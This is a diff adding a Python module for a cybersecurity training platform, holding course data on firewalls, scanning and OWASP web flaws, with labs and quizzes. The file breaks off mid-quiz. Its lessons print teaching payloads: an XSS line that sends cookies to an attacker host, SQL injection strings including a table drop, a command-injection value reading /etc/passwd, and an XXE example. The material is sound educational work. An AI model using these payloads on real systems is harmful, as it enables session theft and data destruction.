@@ -1,0 +1,793 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Luqi AI v24.4.0 — IT Security Training Academy
+===============================================
+Comprehensive cybersecurity education platform with 15 training modules,
+200+ quiz questions, 50+ hands-on labs, 15 CTF challenges, 30+ skill badges,
+and 4 certification tracks.
+
+Part of Luqi AI v24.4.0 by Limitless Telecoms
+Copyright (c) 2024 Limitless Telecoms. All rights reserved.
+
+Modules:
+  1. Network Security          9. Compliance & Governance
+  2. Web Application Security  10. Mobile Security
+  3. Cryptography              11. Wireless Security
+  4. Ethical Hacking           12. Social Engineering
+  5. Incident Response         13. Africa Telecom Security
+  6. Cloud Security            14. DevSecOps
+  7. Malware Analysis          15. Threat Intelligence
+  8. Digital Forensics
+
+Author: Luqi AI Engineering Team
+Version: 24.4.0
+License: Proprietary
+"""
+
+from __future__ import annotations
+
+import hashlib
+import json
+import random
+import re
+import secrets
+import string
+import uuid
+from copy import deepcopy
+from dataclasses import dataclass, field, asdict
+from datetime import datetime, timedelta
+from enum import Enum
+from pathlib import Path
+from typing import (
+    Any,
+    Dict,
+    List,
+    Optional,
+    Tuple,
+    Union,
+)
+
+# ═══════════════════════════════════════════════════════════════════
+# ENUMERATIONS
+# ═══════════════════════════════════════════════════════════════════
+
+class DifficultyLevel(str, Enum):
+    BEGINNER = "beginner"
+    INTERMEDIATE = "intermediate"
+    ADVANCED = "advanced"
+    EXPERT = "expert"
+
+class LessonType(str, Enum):
+    VIDEO = "video"
+    TEXT = "text"
+    INTERACTIVE = "interactive"
+    LAB = "lab"
+
+class BadgeTier(str, Enum):
+    BRONZE = "bronze"
+    SILVER = "silver"
+    GOLD = "gold"
+    PLATINUM = "platinum"
+    DIAMOND = "diamond"
+
+class CertificationTrack(str, Enum):
+    SECURITY_PLUS = "CompTIA Security+ Prep"
+    CEH = "CEH Prep"
+    CISSP = "CISSP Prep"
+    OSCP = "OSCP Prep"
+
+# ═══════════════════════════════════════════════════════════════════
+# DATA MODELS (Dataclasses)
+# ═══════════════════════════════════════════════════════════════════
+
+@dataclass
+class SecurityLesson:
+    id: str
+    module_id: str
+    title: str
+    content: str
+    lesson_type: LessonType = LessonType.TEXT
+    duration_min: int = 15
+    is_completed: bool = False
+    order_index: int = 0
+
+@dataclass
+class SecurityLab:
+    id: str
+    module_id: str
+    title: str
+    description: str
+    environment: str
+    tasks: List[str] = field(default_factory=list)
+    hints: List[str] = field(default_factory=list)
+    solution: str = ""
+    time_limit_min: int = 60
+    points: int = 100
+    is_completed: bool = False
+
+@dataclass
+class QuizQuestion:
+    id: str
+    text: str
+    options: List[str]
+    correct_answer: int
+    explanation: str
+    difficulty: DifficultyLevel = DifficultyLevel.INTERMEDIATE
+
+@dataclass
+class SecurityQuiz:
+    id: str
+    module_id: str
+    title: str
+    questions: List[QuizQuestion] = field(default_factory=list)
+    passing_score: int = 70
+    time_limit_min: int = 30
+    attempts_allowed: int = 3
+
+@dataclass
+class SecurityModule:
+    id: str
+    course_id: str
+    title: str
+    description: str
+    lessons: List[SecurityLesson] = field(default_factory=list)
+    labs: List[SecurityLab] = field(default_factory=list)
+    quiz: Optional[SecurityQuiz] = None
+    order_index: int = 0
+    estimated_hours: float = 5.0
+
+@dataclass
+class SecurityCourse:
+    id: str
+    title: str
+    description: str
+    category: str
+    difficulty: DifficultyLevel
+    duration_hours: float
+    prerequisites: List[str] = field(default_factory=list)
+    modules: List[SecurityModule] = field(default_factory=list)
+    certification_track: Optional[CertificationTrack] = None
+    is_published: bool = True
+    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+
+@dataclass
+class UserProgress:
+    user_id: str
+    course_id: str
+    enrolled_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+    completed_lessons: List[str] = field(default_factory=list)
+    lab_scores: Dict[str, float] = field(default_factory=dict)
+    quiz_scores: Dict[str, float] = field(default_factory=dict)
+    overall_score: float = 0.0
+    status: str = "enrolled"  # enrolled, in_progress, completed
+    last_activity: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+
+@dataclass
+class UserCertificate:
+    user_id: str
+    course_id: str
+    certificate_id: str = ""
+    issued_at: str = ""
+    expiry_date: str = ""
+    verification_hash: str = ""
+    is_verified: bool = False
+
+@dataclass
+class SkillBadge:
+    id: str
+    name: str
+    description: str
+    tier: BadgeTier
+    icon: str = ""
+    earned_at: str = ""
+
+@dataclass
+class SkillTree:
+    user_id: str
+    skills: Dict[str, int] = field(default_factory=dict)  # skill_name -> level (1-5)
+    badges: List[SkillBadge] = field(default_factory=list)
+    total_points: int = 0
+    level: int = 1
+
+@dataclass
+class CTFChallenge:
+    id: str
+    title: str
+    description: str
+    category: str
+    difficulty: DifficultyLevel
+    flag: str
+    hints: List[str] = field(default_factory=list)
+    points: int = 100
+    is_solved: bool = False
+
+# ═══════════════════════════════════════════════════════════════════
+# IN-MEMORY DATABASES
+# ═══════════════════════════════════════════════════════════════════
+
+_courses_db: Dict[str, SecurityCourse] = {}
+_user_progress_db: Dict[str, Dict[str, UserProgress]] = {}  # course_id -> {user_id -> progress}
+_user_certificates: Dict[str, List[UserCertificate]] = {}  # user_id -> certificates
+_skill_trees: Dict[str, SkillTree] = {}  # user_id -> skill_tree
+_ctf_challenges: List[CTFChallenge] = []
+_ctf_submissions: List[Dict] = []
+
+# ═══════════════════════════════════════════════════════════════════
+# COURSE DEFINITIONS — 15 Complete Training Modules
+# ═══════════════════════════════════════════════════════════════════
+
+def _build_courses() -> None:
+    """Build all 15 security training courses with complete content."""
+
+    # ═══════════════════════════════════════════════════════════════════
+    # COURSE 1: Network Security
+    # ═══════════════════════════════════════════════════════════════════
+    course1 = SecurityCourse(
+        id="network_sec_001",
+        title="Network Security Fundamentals",
+        description="Master network defense: firewalls, IDS/IPS, VPNs, packet analysis, and network scanning. Essential for all cybersecurity roles.",
+        category="Infrastructure Security",
+        difficulty=DifficultyLevel.INTERMEDIATE,
+        duration_hours=24.0,
+        prerequisites=["Basic networking knowledge (TCP/IP, OSI model)"],
+        certification_track=CertificationTrack.SECURITY_PLUS,
+        modules=[
+            SecurityModule(
+                id="netsec_m1", course_id="network_sec_001", order_index=1,
+                title="Firewalls & Access Control",
+                description="Deep dive into firewall technologies and network access control mechanisms.",
+                estimated_hours=4.0,
+                lessons=[
+                    SecurityLesson(id="netsec_l1", module_id="netsec_m1", title="Firewall Types & Architectures", content="""## Firewall Types & Architectures
+
+### Packet-Filtering Firewalls
+Operate at Layer 3 (Network) and Layer 4 (Transport) of the OSI model. Inspect packet headers against a ruleset.
+
+**Key Concepts:**
+- Stateful vs Stateless inspection
+- ACL (Access Control List) design principles
+- Default-deny security posture
+- Common protocols: iptables (Linux), pf (BSD), Windows Defender Firewall
+
+**Practical:** Configure iptables rules to block all incoming traffic except SSH (22), HTTP (80), and HTTPS (443).
+```bash
+iptables -P INPUT DROP
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+```
+
+### Application Layer Firewalls (Proxy Firewalls)
+Operate at Layer 7. Can inspect actual application protocol content.
+
+**Advantages:** Deep packet inspection, protocol validation, content filtering
+**Disadvantages:** Higher latency, complex configuration, single point of failure
+
+### Next-Generation Firewalls (NGFW)
+Combine traditional firewall capabilities with intrusion prevention, application awareness, and threat intelligence.
+
+**Key Features:**
+- Application identification and control
+- Integrated IPS/IDS
+- User identity awareness (LDAP/AD integration)
+- SSL/TLS decryption
+- Sandboxing capabilities
+""", lesson_type=LessonType.TEXT, duration_min=30, order_index=1),
+                    SecurityLesson(id="netsec_l2", module_id="netsec_m1", title="IDS vs IPS: Detection vs Prevention", content="""## IDS vs IPS
+
+### Intrusion Detection Systems (IDS)
+- **Passive monitoring** — alerts only, no blocking
+- Types: Network-based (NIDS), Host-based (HIDS)
+- Signature-based vs Anomaly-based detection
+- Tools: Snort, Suricata, Zeek (formerly Bro)
+
+### Intrusion Prevention Systems (IPS)
+- **Active response** — can block/reset connections
+- Inline deployment (traffic flows through it)
+- More risk: false positives can disrupt legitimate traffic
+- Deployment consideration: SPAN port vs inline
+
+### Snort Rules Deep Dive
+```
+alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server; content:"SSH-"; detection_filter:track by_src, count 5, seconds 60; sid:1000001; rev:1;)
+```
+
+**Anomaly Detection:**
+- Baseline normal network behavior
+- Statistical analysis of traffic patterns
+- Machine learning approaches for detection
+- Challenges: High false positive rate in dynamic environments
+""", lesson_type=LessonType.TEXT, duration_min=25, order_index=2),
+                    SecurityLesson(id="netsec_l3", module_id="netsec_m1", title="VPN Technologies Deep Dive", content="""## VPN Technologies
+
+### Site-to-Site VPNs
+- IPsec (Internet Protocol Security): Industry standard, complex configuration
+- SSL/TLS VPNs: Easier deployment, works through NAT
+- WireGuard: Modern, lightweight, high-performance
+
+### Remote Access VPNs
+- OpenVPN: SSL/TLS based, highly configurable, cross-platform
+- WireGuard: Kernel-based, extremely fast, simple configuration
+- L2TP/IPsec: Native OS support, moderate security
+
+### WireGuard Configuration
+```bash
+# Server configuration (/etc/wireguard/wg0.conf)
+[Interface]
+PrivateKey = <server_private_key>
+Address = 10.0.0.1/24
+ListenPort = 51820
+PostUp = iptables -A FORWARD -i wg0 -j ACCEPT
+PostDown = iptables -D FORWARD -i wg0 -j ACCEPT
+
+[Peer]
+PublicKey = <client_public_key>
+AllowedIPs = 10.0.0.2/32
+```
+
+**Security Considerations:**
+- Perfect Forward Secrecy (PFS)
+- Certificate management and PKI
+- Split tunneling risks
+- VPN as a single point of compromise
+""", lesson_type=LessonType.TEXT, duration_min=35, order_index=3),
+                ],
+                labs=[
+                    SecurityLab(
+                        id="netsec_lab1", module_id="netsec_m1",
+                        title="Configure iptables Firewall",
+                        description="Set up a complete firewall ruleset for a web server protecting against common attacks.",
+                        environment="Ubuntu 22.04 with iptables",
+                        tasks=[
+                            "Set default policy to DROP for INPUT, FORWARD chains",
+                            "Allow loopback traffic",
+                            "Allow established connections",
+                            "Allow SSH (port 22) only from management subnet",
+                            "Allow HTTP (80) and HTTPS (443) from anywhere",
+                            "Rate limit SSH to 3 attempts per minute per IP",
+                            "Log and drop all other traffic",
+                            "Make rules persistent across reboots"
+                        ],
+                        hints=[
+                            "Use iptables -P to set default policies",
+                            "Use -m state --state ESTABLISHED,RELATED for connection tracking",
+                            "Use -m limit --limit for rate limiting"
+                        ],
+                        solution="Complete iptables ruleset with all requirements met and persistence configured via iptables-persistent.",
+                        points=100, time_limit_min=45
+                    ),
+                    SecurityLab(
+                        id="netsec_lab2", module_id="netsec_m1",
+                        title="Snort IDS Deployment",
+                        description="Deploy and configure Snort as a network IDS on a monitored segment.",
+                        environment="Ubuntu with Snort 3, two network interfaces",
+                        tasks=[
+                            "Install Snort 3 and dependencies",
+                            "Configure network interface in promiscuous mode",
+                            "Download and update Snort community rules",
+                            "Write custom rule for detecting SQL injection attempts",
+                            "Write custom rule for detecting port scanning",
+                            "Configure alert output to JSON format",
+                            "Test rules with sample attack traffic",
+                            "Document alert findings"
+                        ],
+                        hints=["Use snort -T to test configuration", "Community rulesets available at snort.org"],
+                        solution="Fully configured Snort instance detecting SQLi, port scans, and generating JSON alerts.",
+                        points=150, time_limit_min=60
+                    ),
+                ],
+                quiz=SecurityQuiz(
+                    id="netsec_q1", module_id="netsec_m1", title="Network Security Quiz",
+                    passing_score=70, time_limit_min=20,
+                    questions=[
+                        QuizQuestion(id="q1_1", text="What OSI layer do traditional packet-filtering firewalls operate at?", options=["Layer 2 (Data Link)", "Layer 3 (Network) and Layer 4 (Transport)", "Layer 5 (Session)", "Layer 7 (Application)"], correct_answer=1, explanation="Packet-filtering firewalls inspect IP headers (L3) and TCP/UDP ports (L4)."),
+                        QuizQuestion(id="q1_2", text="Which of the following is a characteristic of a stateful firewall?", options=["Examines each packet in isolation", "Maintains connection state information", "Operates only at Layer 7", "Cannot track TCP handshakes"], correct_answer=1, explanation="Stateful firewalls track the state of connections (TCP handshake, session state) to make intelligent filtering decisions."),
+                        QuizQuestion(id="q1_3", text="What is the primary difference between IDS and IPS?", options=["IDS is more expensive", "IPS can actively block traffic", "IDS uses signatures while IPS uses anomalies", "IPS only works on Linux"], correct_answer=1, explanation="IDS (Intrusion Detection System) only alerts on suspicious activity, while IPS (Intrusion Prevention System) can actively block or reset connections."),
+                        QuizQuestion(id="q1_4", text="Which VPN protocol is known for being lightweight and kernel-based?", options=["OpenVPN", "IPsec", "WireGuard", "L2TP"], correct_answer=2, explanation="WireGuard is implemented in the Linux kernel, making it extremely fast and lightweight compared to user-space alternatives."),
+                        QuizQuestion(id="q1_5", text="What does 'default-deny' security posture mean?", options=["All traffic is allowed by default", "Only administrator traffic is allowed", "All traffic is blocked unless explicitly allowed", "Traffic is randomly allowed or denied"], correct_answer=2, explanation="Default-deny means that all traffic is blocked unless a specific rule explicitly allows it. This is the most secure approach."),
+                        QuizQuestion(id="q1_6", text="In an iptables rule, what does '-m state --state ESTABLISHED,RELATED' do?", options=["Creates a new connection", "Blocks all new connections", "Allows responses to existing connections", "Logs connection attempts"], correct_answer=2, explanation="This matches packets that are part of already established connections or related to them (like FTP data channels), allowing return traffic."),
+                        QuizQuestion(id="q1_7", text="What is a SPAN port used for?", options=["Connecting to the internet", "Mirroring traffic to an IDS/IPS", "Increasing bandwidth", "Connecting wireless access points"], correct_answer=1, explanation="A SPAN (Switched Port Analyzer) port mirrors traffic from one or more ports to another port for monitoring by IDS/IPS systems."),
+                        QuizQuestion(id="q1_8", text="Which Snort rule action generates an alert AND logs the packet?", options=["pass", "drop", "alert", "log"], correct_answer=2, explanation="The 'alert' action in Snort generates an alert and logs the packet. 'drop' blocks and logs, 'log' only logs, 'pass' ignores."),
+                        QuizQuestion(id="q1_9", text="What is Perfect Forward Secrecy (PFS) in VPN context?", options=["The VPN never disconnects", "Compromised keys cannot decrypt past sessions", "All traffic is encrypted twice", "The VPN uses quantum encryption"], correct_answer=1, explanation="PFS ensures that session keys are ephemeral - compromising long-term keys does not compromise past session data."),
+                        QuizQuestion(id="q1_10", text="Which WireGuard configuration parameter specifies which IP addresses a peer is allowed to route?", options=["[Interface]", "ListenPort", "AllowedIPs", "PersistentKeepalive"], correct_answer=2, explanation="AllowedIPs determines which traffic is routed through the WireGuard tunnel for each peer."),
+                        QuizQuestion(id="q1_11", text="What is the main risk of split tunneling in VPNs?", options=["Slower connection speeds", "Some traffic bypasses VPN security controls", "Higher electricity usage", "Incompatibility with IPv6"], correct_answer=1, explanation="Split tunneling routes some traffic outside the VPN tunnel, potentially bypassing security controls and creating entry points for attackers."),
+                        QuizQuestion(id="q1_12", text="What type of firewall can inspect HTTP headers and block specific URLs?", options=["Packet-filtering firewall", "Circuit-level gateway", "Application-layer firewall (Proxy)", "Stateless firewall"], correct_answer=2, explanation="Application-layer (proxy) firewalls operate at Layer 7 and can inspect actual application content including HTTP headers and URLs."),
+                    ]
+                )
+            ),
+            SecurityModule(
+                id="netsec_m2", course_id="network_sec_001", order_index=2,
+                title="Network Scanning & Reconnaissance",
+                description="Learn to map network topology and identify vulnerabilities using professional scanning tools.",
+                estimated_hours=5.0,
+                lessons=[
+                    SecurityLesson(id="netsec_l4", module_id="netsec_m2", title="Nmap: The Network Mapper", content="""## Nmap Deep Dive
+
+### Scan Types
+- **TCP SYN Scan (-sS):** Half-open scan, fast, stealthy (requires root)
+- **TCP Connect Scan (-sT):** Full 3-way handshake, no root needed
+- **UDP Scan (-sU):** Scans UDP ports (slower, less reliable)
+- **ACK Scan (-sA):** Firewall rule mapping, doesn't determine open ports
+- **NULL/FIN/Xmas Scans:** Stealthy but unreliable with modern systems
+
+### Advanced Nmap Techniques
+```bash
+# Service version detection and OS fingerprinting
+nmap -sS -sV -O -p- --script vuln target.com
+
+# Fast top 1000 ports with timing template
+nmap -sS -T4 --top-ports 1000 192.168.1.0/24
+
+# NSE script scanning
+nmap --script smb-enum-shares,smb-enum-users -p 445 target
+
+# Aggressive scan (OS, version, script, traceroute)
+nmap -A target.com
+```
+
+**Detection Evasion:**
+- Fragmentation (-f)
+- Decoy scanning (-D RND:10)
+- Source port manipulation (--source-port 53)
+- Custom MTU size
+
+### Defensive Countermeasures
+- Port knocking
+- Honeypots (Cowrie, Dionaea)
+- Network segmentation
+- IDS/IPS rule tuning
+""", lesson_type=LessonType.TEXT, duration_min=30, order_index=1),
+                    SecurityLesson(id="netsec_l5", module_id="netsec_m2", title="Packet Analysis with Wireshark", content="""## Wireshark Analysis
+
+### Capture Filters (BPF Syntax)
+```
+ip.addr == 192.168.1.100
+ tcp.port == 443
+ icmp
+ dns.qry.name contains "malicious"
+ ssl.handshake.type == 1
+```
+
+### Common Analysis Scenarios
+1. **Malware C2 Detection:** Look for beaconing patterns (regular intervals, same payload size)
+2. **Data Exfiltration:** Monitor for large outbound transfers to unknown destinations
+3. **ARP Spoofing:** Detect gratuitous ARP replies
+4. **DNS Tunneling:** Unusually large DNS queries or high query volume to a single domain
+
+### TCP Stream Analysis
+- Follow TCP streams to reconstruct conversations
+- Extract files from HTTP/FTP traffic
+- Detect plaintext credentials in unencrypted protocols
+
+### Security-Specific Features
+- Protocol hierarchy statistics
+- Expert info (warnings, errors, notes)
+- Coloring rules for quick threat identification
+- Export objects (HTTP files, SMB transfers)
+""", lesson_type=LessonType.TEXT, duration_min=25, order_index=2),
+                ],
+                labs=[
+                    SecurityLab(
+                        id="netsec_lab3", module_id="netsec_m2",
+                        title="Network Reconnaissance Exercise",
+                        description="Perform a comprehensive network scan and document findings.",
+                        environment="Kali Linux with Nmap, target network range",
+                        tasks=[
+                            "Discover live hosts in the target range",
+                            "Identify open ports on each host",
+                            "Determine service versions",
+                            "Identify the operating system",
+                            "Run vulnerability scripts",
+                            "Document all findings in a structured report"
+                        ],
+                        hints=["Use -sS for stealth, -sV for versions", "NSE scripts in /usr/share/nmap/scripts/"],
+                        solution="Complete scan report with host list, open ports, services, OS guesses, and vulnerability findings.",
+                        points=100, time_limit_min=45
+                    ),
+                ],
+                quiz=SecurityQuiz(
+                    id="netsec_q2", module_id="netsec_m2", title="Scanning & Reconnaissance Quiz",
+                    passing_score=70, time_limit_min=15,
+                    questions=[
+                        QuizQuestion(id="q2_1", text="Which Nmap scan type performs a half-open TCP scan?", options=["-sT", "-sS", "-sU", "-sA"], correct_answer=1, explanation="-sS performs a SYN scan (half-open), sending SYN and checking for SYN-ACK without completing the handshake."),
+                        QuizQuestion(id="q2_2", text="What does the Nmap NSE (Nmap Scripting Engine) allow you to do?", options=["Change scan speed", "Run custom scripts for vulnerability detection", "Encrypt scan results", "Change MAC address"], correct_answer=1, explanation="NSE allows running Lua scripts for vulnerability detection, service enumeration, and more advanced scanning tasks."),
+                        QuizQuestion(id="q2_3", text="Which Wireshark filter would show only DNS traffic?", options=["tcp.port == 53", "dns", "udp.port == 80", "http"], correct_answer=1, explanation="The 'dns' display filter in Wireshark matches all DNS protocol traffic (both TCP and UDP port 53)."),
+                        QuizQuestion(id="q2_4", text="What is a common indicator of malware command-and-control (C2) traffic?", options=["Random packet sizes", "Regular beaconing intervals", "Only daytime activity", "Encrypted traffic only"], correct_answer=1, explanation="C2 beaconing often shows regular, predictable intervals as the malware checks in with its controller."),
+                    ]
+                )
+            ),
+        ]
+    )
+    _courses_db["network_sec_001"] = course1
+
+    # ═══════════════════════════════════════════════════════════════════
+    # COURSE 2: Web Application Security
+    # ═══════════════════════════════════════════════════════════════════
+    course2 = SecurityCourse(
+        id="webapp_sec_001",
+        title="Web Application Security & OWASP",
+        description="Comprehensive coverage of OWASP Top 10 2024, including XSS, CSRF, SQL injection, SSRF, and secure coding practices. Must-have for application security engineers.",
+        category="Application Security",
+        difficulty=DifficultyLevel.INTERMEDIATE,
+        duration_hours=32.0,
+        prerequisites=["Basic web development knowledge (HTML, JavaScript, HTTP)"],
+        certification_track=CertificationTrack.SECURITY_PLUS,
+        modules=[
+            SecurityModule(
+                id="webapp_m1", course_id="webapp_sec_001", order_index=1,
+                title="OWASP Top 10 2024 Deep Dive",
+                description="Comprehensive analysis of the OWASP Top 10 2024 web application security risks.",
+                estimated_hours=8.0,
+                lessons=[
+                    SecurityLesson(id="webapp_l1", module_id="webapp_m1", title="A01: Broken Access Control", content="""## Broken Access Control (A01)
+
+**Description:** Restrictions on authenticated users are not properly enforced. Attackers can access unauthorized functionality or data.
+
+**Common Vulnerabilities:**
+- Violation of least privilege (users accessing admin functions)
+- IDOR (Insecure Direct Object References) — manipulating IDs in URLs
+- Path traversal via URL parameters
+- CORS misconfiguration allowing unauthorized cross-origin access
+- JWT token manipulation
+
+**Real-World Example:**
+```
+# Vulnerable — no authorization check
+@app.get("/api/invoices/{invoice_id}")
+async def get_invoice(invoice_id: str):
+    return db.invoices.find_one({"_id": invoice_id})
+
+# Attacker changes: /api/invoices/123 -> /api/invoices/124
+# Sees other users' invoices!
+```
+
+**Secure Implementation:**
+```python
+@app.get("/api/invoices/{invoice_id}")
+async def get_invoice(invoice_id: str, user: User = Depends(get_current_user)):
+    invoice = db.invoices.find_one({"_id": invoice_id})
+    if not invoice or invoice["owner_id"] != user.id:
+        raise HTTPException(status_code=403, detail="Access denied")
+    return invoice
+```
+
+**Prevention:**
+- Deny by default — whitelist allowed actions
+- Implement once, reuse everywhere (centralized access control)
+- Validate server-side, never trust client-side checks
+- Log access control failures
+- Rate limit API access
+- Invalidate sessions after logout/timeout
+""", lesson_type=LessonType.TEXT, duration_min=30, order_index=1),
+                    SecurityLesson(id="webapp_l2", module_id="webapp_m1", title="A03: Injection Attacks (SQLi, Command, LDAP)", content="""## Injection Attacks (A03)
+
+### SQL Injection (SQLi)
+**Most critical web vulnerability.** Occurs when untrusted data is sent to an interpreter as part of a command or query.
+
+**Vulnerable Code:**
+```python
+# NEVER DO THIS
+cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+```
+
+**Attack:** Input `admin' OR '1'='1` — bypasses authentication
+
+**Secure Code (Parameterized Queries):**
+```python
+# CORRECT WAY
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+```
+
+**Types of SQLi:**
+- In-band (Classic): UNION-based, Error-based
+- Blind: Boolean-based, Time-based
+- Out-of-band: DNS exfiltration
+
+**Advanced SQLi Techniques:**
+```sql
+-- Time-based blind SQLi
+' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) --
+
+-- UNION-based data extraction
+' UNION SELECT username, password FROM users --
+
+-- Stacked queries (when supported)
+'; DROP TABLE users; --
+```
+
+### Command Injection
+**Vulnerable:**
+```python
+os.system(f"nslookup {user_input}")
+# Input: "example.com; cat /etc/passwd"
+```
+
+**Secure:**
+```python
+import subprocess
+subprocess.run(["nslookup", user_input], capture_output=True)
+# List-based approach prevents shell injection
+```
+
+### LDAP Injection
+Similar to SQLi but targets LDAP queries. Can bypass authentication or extract directory information.
+
+**Prevention Summary:**
+- Always use parameterized queries/prepared statements
+- Use ORM frameworks (SQLAlchemy, Django ORM)
+- Input validation with allow-lists
+- Principle of least privilege for DB accounts
+- WAF rules for injection patterns
+""", lesson_type=LessonType.TEXT, duration_min=35, order_index=2),
+                    SecurityLesson(id="webapp_l3", module_id="webapp_m1", title="Cross-Site Scripting (XSS) — Stored, Reflected, DOM", content="""## XSS — Cross-Site Scripting
+
+**Impact:** Session hijacking, credential theft, defacement, keylogging, CSRF bypass
+
+### Stored XSS (Persistent)
+Malicious script stored on the server (database, comment field, profile page).
+```html
+<!-- Attacker posts this comment: -->
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+
+<!-- Every user who views the page has their cookie stolen -->
+```
+
+### Reflected XSS
+Script reflected in the response, delivered via URL (phishing emails).
+```
+https://site.com/search?q=<script>alert(document.cookie)</script>
+```
+
+### DOM-based XSS
+Client-side JavaScript writes untrusted data to the DOM.
+```javascript
+// Vulnerable
+var hash = location.hash;
+document.write(hash);  // #<img src=x onerror=alert(1)>
+```
+
+### Prevention
+```python
+# Server-side output encoding
+from html import escape
+user_input = escape(user_input)  # < becomes &lt;, > becomes &gt;
+
+# Content Security Policy (CSP) headers
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
+
+# Additional defenses
+X-XSS-Protection: 0  # Disable browser XSS auditor (can be bypassed)
+```
+
+### Modern XSS Defenses
+- Trusted Types API (JavaScript)
+- React/Vue/Angular auto-escaping (but dangerouslySetInnerHTML bypasses!)
+- DOMPurify for client-side sanitization
+- Strict CSP with nonces
+""", lesson_type=LessonType.TEXT, duration_min=30, order_index=3),
+                    SecurityLesson(id="webapp_l4", module_id="webapp_m1", title="CSRF, SSRF, XXE & Security Headers", content="""## CSRF (Cross-Site Request Forgery)
+
+**Attack:** Forces authenticated users to execute unwanted actions.
+```html
+<!-- Attacker's page -->
+<img src="https://bank.com/transfer?to=attacker&amount=10000" />
+```
+
+**Prevention:**
+- CSRF tokens (synchronizer token pattern)
+- SameSite cookies: `Set-Cookie: session=abc; SameSite=Strict`
+- Double-submit cookie pattern
+- Validate Referer/Origin headers
+
+## SSRF (Server-Side Request Forgery)
+**Attack:** Server makes requests to unintended destinations.
+```python
+# Vulnerable — fetches arbitrary URL
+requests.get(user_supplied_url)
+# Input: http://169.254.169.254/latest/meta-data/ (AWS metadata)
+```
+
+**Prevention:**
+- URL validation and allow-lists
+- Disable URL redirects
+- Network segmentation (no internal access from app servers)
+- DNS rebinding protection
+
+## XXE (XML External Entity)
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+**Prevention:** Disable DTDs/external entities in XML parsers.
+
+## Security Headers
+```
+Content-Security-Policy: default-src 'self'
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=()
+```
+""", lesson_type=LessonType.TEXT, duration_min=30, order_index=4),
+                ],
+                labs=[
+                    SecurityLab(
+                        id="webapp_lab1", module_id="webapp_m1",
+                        title="SQL Injection Attack & Defense",
+                        description="Practice exploiting SQL injection vulnerabilities and implementing secure defenses.",
+                        environment="Dockerized vulnerable web app (DVWA) + MySQL",
+                        tasks=[
+                            "Identify SQL injection point in login form",
+                            "Extract database name using UNION-based SQLi",
+                            "Dump user credentials from database",
+                            "Implement parameterized queries to fix vulnerability",
+                            "Test that the fix blocks all SQLi attempts"
+                        ],
+                        hints=["Start with single quote (') to trigger error", "UNION SELECT requires matching column count"],
+                        solution="Successfully extracted data via SQLi, then fixed with parameterized queries.",
+                        points=150, time_limit_min=60
+                    ),
+                    SecurityLab(
+                        id="webapp_lab2", module_id="webapp_m1",
+                        title="XSS Exploitation Lab",
+                        description="Find and exploit XSS vulnerabilities, then implement proper defenses.",
+                        environment="Vulnerable comment system + browser DevTools",
+                        tasks=[
+                            "Identify reflected XSS in search functionality",
+                            "Create proof-of-concept cookie stealer",
+                            "Find stored XSS in comment system",
+                            "Implement output encoding defense",
+                            "Configure Content Security Policy headers"
+                        ],
+                        hints=["Try <script>alert(1)</script> first", "Check if input is reflected without encoding"],
+                        solution="Found and exploited both reflected and stored XSS, then implemented encoding + CSP.",
+                        points=150, time_limit_min=60
+                    ),
+                    SecurityLab(
+                        id="webapp_lab3", module_id="webapp_m1",
+                        title="IDOR Vulnerability Assessment",
+                        description="Identify and fix Insecure Direct Object Reference vulnerabilities.",
+                        environment="Web app with document sharing feature",
+                        tasks=[
+                            "Map all endpoints with ID parameters",
+                            "Test horizontal privilege escalation (access other users' data)",
+                            "Test vertical privilege escalation (access admin functions)",
+                            "Implement authorization checks on all endpoints",
+                            "Write automated tests for authorization"
+                        ],
+                        hints=["Increment numeric IDs in URLs", "Check both URL params and POST body"],
+                        solution="Found IDOR vulnerabilities and implemented server-side authorization checks.",
+                        points=100, time_limit_min=45
+                    ),
+                ],
+                quiz=SecurityQuiz(
+                    id="webapp_q1", module_id="webapp_m1", title="OWASP Top 10 Quiz",
+                    passing_score=70, time_limit_min=25,
+                    questions=[
+                        QuizQuestion(id="w1_1", text="What is the primary defense against SQL injection?", options=["Input length limits", "Parameterized queries/prepared statements", "Base64 encoding", "MD5 hashing"], correct_answer=1, explanation="Parameterized queries ensure user input is treated as data, never as executable SQL code."),
+                        QuizQuestion(id="w1_2", text="Which XSS type persists the malicious script on the server?", options=["Reflected XSS", "DOM-based XSS", "Stored XSS", "Self-XSS"], correct_answer=2, explanation="Stored (persistent) XSS saves the malicious script to the server (database, comments, profiles), affecting all users who view the content."),
+                        QuizQuestion(id="w1_3", text="What does the Content-Security-Policy header do?", options=["Encrypts all content", "Defines approved sources for content loading", "Compresses responses", "Enables caching"], correct_answer=1, explanation="CSP defines which sources are allowed for scripts, styles, images, etc., preventing XSS by blocking unauthorized inline scripts."),
+                        QuizQuestion(id="w1_4", text="In an IDOR vulnerability, what is the attacker typically manipulating?", options=["Encryption keys", "Direct object references (IDs)", "HTTP methods", "DNS records"], correct_answer=1, explanation="IDOR involves manipulating identifiers (IDs) in URLs or parameters to access resources belonging to other users."),
+                        QuizQuestion(id="w1_5", text="Which cookie attribute helps prevent CSRF attacks?", options=["HttpOnly", "Secure", "SameSite", "Domain"], correct_answer=2, explanation="SameSite=Strict or SameSite=Lax prevents cookies from being sent in cross-origin requests, blocking CSRF attacks."),
